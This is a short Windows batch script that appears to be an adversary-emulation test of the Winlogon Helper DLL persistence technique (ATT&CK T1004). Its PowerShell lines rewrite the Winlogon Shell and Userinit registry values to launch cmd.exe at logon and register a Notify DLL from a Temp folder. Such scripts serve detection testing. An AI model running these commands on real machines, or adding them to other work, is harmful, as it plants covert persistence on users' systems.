@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Winlogon Helper DLL (T1004)
ECHO.
ECHO [+] Add Registry Keys using Powershell to abouse "Winlogon.exe"
ECHO -------------------------------------------------------------------
powershell Set-ItemProperty '"HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"' "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force
powershell Set-ItemProperty '"HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"' "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force
Powershell New-Item '"HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"' -Force
Powershell Set-ItemProperty '"HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"' "logon" "C:\Windows\Temp\atomicNotificationPackage.dll" -Force
ECHO.

